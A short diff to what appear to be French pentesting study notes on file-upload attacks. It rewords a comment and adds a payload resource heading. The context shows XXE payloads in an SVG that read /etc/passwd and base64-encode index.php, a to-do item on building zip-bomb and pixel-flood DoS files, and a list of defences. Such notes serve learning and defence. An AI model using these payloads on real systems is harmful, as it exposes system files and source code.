@@ -121,7 +121,7 @@
       <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
       <svg>&xxe;</svg>
       # [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ] 
-      # pour charger index.php
+      # pour telecharger index.php
     ```
 
     * [ ] _Creation d'un programme de DoS (Zip, PNG, JPG) avec XXE, ( zip bomb, pixel flood) ou encore un SSRF ou file transversal attack_
@@ -146,7 +146,6 @@
 * faire des mises à jour
 * scan anti malware
 * firewall pour web app ( WAF)
-* 
 
 -----
 ## Ressources
@@ -162,3 +161,5 @@
 ###### [_file signature ( magic bytes )_](https://en.wikipedia.org/wiki/List_of_file_signatures)
 
 ###### _intruder payloads_
+
+###### Payload all the things
